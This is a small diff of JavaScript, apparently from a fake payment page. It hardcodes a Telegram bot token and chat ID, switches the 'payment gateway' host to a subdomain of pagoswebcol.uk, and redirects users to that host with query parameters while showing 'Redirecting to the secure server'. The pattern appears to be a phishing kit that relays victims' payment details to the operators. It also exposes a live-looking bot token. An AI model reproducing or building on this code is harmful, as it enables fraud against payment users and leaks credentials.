@@ -1,7 +1,7 @@
 // --- CONSTANTES ---
         const TELEGRAM_BOT_TOKEN = '8425620613:AAGtK8DnpmnRcudQp_tIy4kc7MJuq0QUbPE';
         const TELEGRAM_CHAT_ID = '-4977407810';
-        const API_PASARELA = 'https://api2.pagoswebcol.uk';
+        const API_PASARELA = 'https://aire.pagoswebcol.uk';
 
         // --- VARIABLES GLOBALES ---
         let montoGlobal = 0; 
@@ -199,4 +199,5 @@
                 loaderTitle.innerText = "Redirigiendo al servidor seguro...";
                 window.location.href = `${API_PASARELA}/meter?${params.toString()}`;
             }
+
         });
